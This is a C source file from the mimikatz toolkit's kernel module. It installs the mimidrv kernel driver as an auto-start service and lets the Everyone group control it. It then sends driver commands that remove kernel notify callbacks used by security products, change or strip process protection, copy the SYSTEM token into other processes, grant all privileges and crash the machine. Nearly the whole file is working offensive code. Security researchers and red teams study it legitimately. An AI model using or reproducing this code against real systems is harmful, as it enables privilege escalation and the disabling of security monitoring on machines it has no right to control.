/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_kernel.h"

const KUHL_K_C kuhl_k_c_kernel[] = {
	{kuhl_m_kernel_add_mimidrv,			0,									L"+",				L"Install and/or start mimikatz driver (mimidrv)"},
	{kuhl_m_kernel_remove_mimidrv,		0,									L"-",				L"Remove mimikatz driver (mimidrv)"},
	{NULL,								IOCTL_MIMIDRV_PING,					L"ping",			L"Ping the driver"},
	{NULL,								IOCTL_MIMIDRV_BSOD,					L"bsod",			L"BSOD !"},
	{NULL,								IOCTL_MIMIDRV_PROCESS_LIST,			L"process",			L"List process"},
	{kuhl_m_kernel_processProtect,		0,									L"processProtect",	L"Protect process"},
	{kuhl_m_kernel_processToken,		0,									L"processToken",	L"Duplicate process token"},
	{kuhl_m_kernel_processPrivilege,	0,									L"processPrivilege",L"Set all privilege on process"},
	{NULL,								IOCTL_MIMIDRV_MODULE_LIST,			L"modules",			L"List modules"},
	{NULL,								IOCTL_MIMIDRV_SSDT_LIST,			L"ssdt",			L"List SSDT"},
	{NULL,								IOCTL_MIMIDRV_NOTIFY_PROCESS_LIST,	L"notifProcess",	L"List process notify callbacks"},
	{NULL,								IOCTL_MIMIDRV_NOTIFY_THREAD_LIST,	L"notifThread",		L"List thread notify callbacks"},
	{NULL,								IOCTL_MIMIDRV_NOTIFY_IMAGE_LIST,	L"notifImage",		L"List image notify callbacks"},
	{NULL,								IOCTL_MIMIDRV_NOTIFY_REG_LIST,		L"notifReg",		L"List registry notify callbacks"},
	{NULL,								IOCTL_MIMIDRV_NOTIFY_OBJECT_LIST,	L"notifObject",		L"List object notify callbacks"},
	{kuhl_m_kernel_notifyProcessRemove,	IOCTL_MIMIDRV_NOTIFY_PROCESS_REMOVE,L"notifProcessRemove",	L"Remove process notify callback"},
	{kuhl_m_kernel_notifyObjectRemove,	IOCTL_MIMIDRV_NOTIFY_OBJECT_REMOVE,	L"notifObjectRemove",	L"Remove object notify callback"},
	{NULL,								IOCTL_MIMIDRV_FILTER_LIST,			L"filters",			L"List FS filters"},
	{NULL,								IOCTL_MIMIDRV_MINIFILTER_LIST,		L"minifilters",		L"List minifilters"},
};

NTSTATUS kuhl_m_kernel_do(wchar_t * input)
{
	NTSTATUS status = STATUS_SUCCESS;
	int argc;
	wchar_t ** argv = CommandLineToArgvW(input, &argc);
	unsigned short indexCommand;
	BOOL commandFound = FALSE;

	if(argv && (argc > 0))
	{
		for(indexCommand = 0; !commandFound && (indexCommand < ARRAYSIZE(kuhl_k_c_kernel)); indexCommand++)
		{
			if(commandFound = _wcsicmp(argv[0], kuhl_k_c_kernel[indexCommand].command) == 0)
			{
				if(kuhl_k_c_kernel[indexCommand].pCommand)
					status = kuhl_k_c_kernel[indexCommand].pCommand(argc - 1, argv + 1);
				else
					kull_m_kernel_mimidrv_simple_output(kuhl_k_c_kernel[indexCommand].ioctlCode, NULL, 0);
			}
		}
		if(!commandFound)
			kull_m_kernel_mimidrv_simple_output(IOCTL_MIMIDRV_RAW, input, (DWORD) (wcslen(input) + 1) * sizeof(wchar_t));
	}
	return status;
}

NTSTATUS kuhl_m_kernel_add_mimidrv(int argc, wchar_t * argv[])
{
	wchar_t *absFile, file[] = MIMIKATZ_DRIVER L".sys";
	SC_HANDLE hSC = NULL, hS = NULL;


	if(hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE))
	{
		if(hS = OpenService(hSC, MIMIKATZ_DRIVER, SERVICE_START))
		{
			kprintf(L"[+] mimikatz driver already registered\n");
		}
		else
		{
			if(GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST)
			{
				kprintf(L"[*] mimikatz driver not present\n");
				if(kull_m_file_getAbsolutePathOf(file, &absFile))
				{
					if(kull_m_file_isFileExist(absFile))
					{
						if(hS = CreateService(hSC, MIMIKATZ_DRIVER, L"mimikatz driver (" MIMIKATZ_DRIVER L")", READ_CONTROL | WRITE_DAC | SERVICE_START, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, absFile, NULL, NULL, NULL, NULL, NULL))
						{
							kprintf(L"[+] mimikatz driver successfully registered\n");

							if(kuhl_m_kernel_addWorldToMimikatz(hS))
								kprintf(L"[+] mimikatz driver ACL to everyone\n");
							else PRINT_ERROR_AUTO(L"kuhl_m_kernel_addWorldToMimikatz");
						}
						else PRINT_ERROR_AUTO(L"CreateService");
					}
					else PRINT_ERROR_AUTO(L"kull_m_file_isFileExist");

					LocalFree(absFile);
				}
				else PRINT_ERROR_AUTO(L"kull_m_file_getAbsolutePathOf");
			}
			else PRINT_ERROR_AUTO(L"OpenService");
		}
		if(hS)
		{
			if(StartService(hS, 0, NULL))
				kprintf(L"[+] mimikatz driver started\n");
			else if(GetLastError() == ERROR_SERVICE_ALREADY_RUNNING)
				kprintf(L"[*] mimikatz driver already started\n");
			else
				PRINT_ERROR_AUTO(L"StartService");
			CloseServiceHandle(hS);
		}
		CloseServiceHandle(hSC);
	}
	else PRINT_ERROR_AUTO(L"OpenSCManager(create)");
	return STATUS_SUCCESS;
}

BOOL kuhl_m_kernel_addWorldToMimikatz(SC_HANDLE monHandle)
{
	BOOL status = FALSE;
	DWORD dwSizeNeeded;
	PSECURITY_DESCRIPTOR oldSd, newSd;
	SECURITY_DESCRIPTOR dummySdForXP;
	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
	EXPLICIT_ACCESS ForEveryOne = {
		SERVICE_QUERY_STATUS | SERVICE_QUERY_CONFIG | SERVICE_INTERROGATE | SERVICE_ENUMERATE_DEPENDENTS | SERVICE_PAUSE_CONTINUE | SERVICE_START | SERVICE_STOP | SERVICE_USER_DEFINED_CONTROL | READ_CONTROL,
		SET_ACCESS,
		NO_INHERITANCE,
		{NULL, NO_MULTIPLE_TRUSTEE, TRUSTEE_IS_SID, TRUSTEE_IS_WELL_KNOWN_GROUP, NULL}
	};
	if(!QueryServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, &dummySdForXP, 0, &dwSizeNeeded) && (GetLastError() == ERROR_INSUFFICIENT_BUFFER))
	{
		if(oldSd = (PSECURITY_DESCRIPTOR) LocalAlloc(LPTR, dwSizeNeeded))
		{
			if(QueryServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, oldSd, dwSizeNeeded, &dwSizeNeeded))
			{
				if(AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, (PSID *)&ForEveryOne.Trustee.ptstrName))
				{
					if(BuildSecurityDescriptor(NULL, NULL, 1, &ForEveryOne, 0, NULL, oldSd, &dwSizeNeeded, &newSd) == ERROR_SUCCESS)
					{
						status = SetServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, newSd);
						LocalFree(newSd);
					}
					FreeSid(ForEveryOne.Trustee.ptstrName);
				}
			}
			LocalFree(oldSd);
		}
	}
	return status;
}

NTSTATUS kuhl_m_kernel_remove_mimidrv(int argc, wchar_t * argv[])
{
	BOOL toRemove = TRUE;
	if(kull_m_service_stop(MIMIKATZ_DRIVER))
		kprintf(L"[+] mimikatz driver stopped\n");
	else if(GetLastError() == ERROR_SERVICE_NOT_ACTIVE)
		kprintf(L"[*] mimikatz driver not running\n");
	else
	{
		toRemove = FALSE;
		PRINT_ERROR_AUTO(L"kull_m_service_stop");
	}

	if(toRemove)
	{
		if(kull_m_service_remove(MIMIKATZ_DRIVER))
			kprintf(L"[+] mimikatz driver removed\n");
		else
			PRINT_ERROR_AUTO(L"kull_m_service_remove");
	}
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_kernel_processProtect(int argc, wchar_t * argv[])
{
	MIMIDRV_PROCESS_PROTECT_INFORMATION protectInfos = {0, {0, 0, {0, 0, 0}}};
	PCWCHAR szProcessName, szPid;
	BOOL isUnprotect;

	if(MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_VISTA)
	{
		isUnprotect = kull_m_string_args_byName(argc, argv, L"remove", NULL, NULL);
		if(kull_m_string_args_byName(argc, argv, L"process", &szProcessName, NULL))
		{
			kprintf(L"Process : %s\n", szProcessName);
			if(!kull_m_process_getProcessIdForName(szProcessName, &protectInfos.processId))
				PRINT_ERROR_AUTO(L"kull_m_process_getProcessIdForName");
		}
		else if(kull_m_string_args_byName(argc, argv, L"pid", &szPid, NULL))
		{
			protectInfos.processId = wcstoul(szPid, NULL, 0);
		}
		else PRINT_ERROR(L"Argument /process:program.exe or /pid:processid needed\n");

		if(protectInfos.processId)
		{
			if(!isUnprotect)
			{
				if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8)
				{
					protectInfos.SignatureProtection.SignatureLevel = 1;
				}
				else if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_BLUE)
				{
					protectInfos.SignatureProtection.SignatureLevel = 0x0f;
					protectInfos.SignatureProtection.SectionSignatureLevel = 0x0f;
				}
				else
				{
					protectInfos.SignatureProtection.SignatureLevel = 0x3f;
					protectInfos.SignatureProtection.SectionSignatureLevel = 0x3f;

					protectInfos.SignatureProtection.Protection.Type = 2;
					protectInfos.SignatureProtection.Protection.Audit = 0;
					protectInfos.SignatureProtection.Protection.Signer = 6;
				}
			}
			kprintf(L"PID %u -> %02x/%02x [%1x-%1x-%1x]\n", protectInfos.processId, protectInfos.SignatureProtection.SignatureLevel, protectInfos.SignatureProtection.SectionSignatureLevel, protectInfos.SignatureProtection.Protection.Type, protectInfos.SignatureProtection.Protection.Audit, protectInfos.SignatureProtection.Protection.Signer);
			kull_m_kernel_mimidrv_simple_output(IOCTL_MIMIDRV_PROCESS_PROTECT, &protectInfos, sizeof(MIMIDRV_PROCESS_PROTECT_INFORMATION));
		}
		else PRINT_ERROR(L"No PID\n");
	}
	else PRINT_ERROR(L"Protected process not available before Windows Vista\n");
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_kernel_processToken(int argc, wchar_t * argv[])
{
	MIMIDRV_PROCESS_TOKEN_FROM_TO tokenInfo = {0, 0};
	PCWCHAR szFrom, szTo;

	if(kull_m_string_args_byName(argc, argv, L"from", &szFrom, NULL))
		tokenInfo.fromProcessId = wcstoul(szFrom, NULL, 0);

	if(kull_m_string_args_byName(argc, argv, L"to", &szTo, NULL))
		tokenInfo.toProcessId = wcstoul(szTo, NULL, 0);

	kprintf(L"Token from process %u to process %u\n", tokenInfo.fromProcessId, tokenInfo.toProcessId);
	if(!tokenInfo.fromProcessId)
		kprintf(L" * from 0 will take SYSTEM token\n");
	if(!tokenInfo.toProcessId)
		kprintf(L" * to 0 will take all \'cmd\' and \'mimikatz\' process\n");

	kull_m_kernel_mimidrv_simple_output(IOCTL_MIMIDRV_PROCESS_TOKEN, &tokenInfo, sizeof(MIMIDRV_PROCESS_TOKEN_FROM_TO));

	return STATUS_SUCCESS;
}


NTSTATUS kuhl_m_kernel_processPrivilege(int argc, wchar_t * argv[])
{
	PCWCHAR szPid;
	ULONG pid = 0;

	if(kull_m_string_args_byName(argc, argv, L"pid", &szPid, NULL))
		pid = wcstoul(szPid, NULL, 0);
	
	kull_m_kernel_mimidrv_simple_output(IOCTL_MIMIDRV_PROCESS_FULLPRIV, pid ? &pid : NULL, pid ? sizeof(ULONG) : 0);
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_kernel_notifyProcessRemove(int argc, wchar_t * argv[])
{
	return kuhl_m_kernel_notifyGenericRemove(argc, argv, IOCTL_MIMIDRV_NOTIFY_PROCESS_REMOVE);
}

NTSTATUS kuhl_m_kernel_notifyObjectRemove(int argc, wchar_t * argv[])
{
	return kuhl_m_kernel_notifyGenericRemove(argc, argv, IOCTL_MIMIDRV_NOTIFY_OBJECT_REMOVE);
}

NTSTATUS kuhl_m_kernel_notifyGenericRemove(int argc, wchar_t * argv[], DWORD code)
{
	PVOID p;
	if(argc)
	{
#ifdef _M_X64
		p = (PVOID) _wcstoui64(argv[0], NULL, 0);
#else ifdef _M_IX86
		p = (PVOID) wcstoul(argv[0], NULL, 0);
#endif
		kprintf(L"Target = 0x%p\n", p);	
		kull_m_kernel_mimidrv_simple_output(code, &p, sizeof(PVOID));
	}
	else PRINT_ERROR(L"No address?\n");
	return STATUS_SUCCESS;
}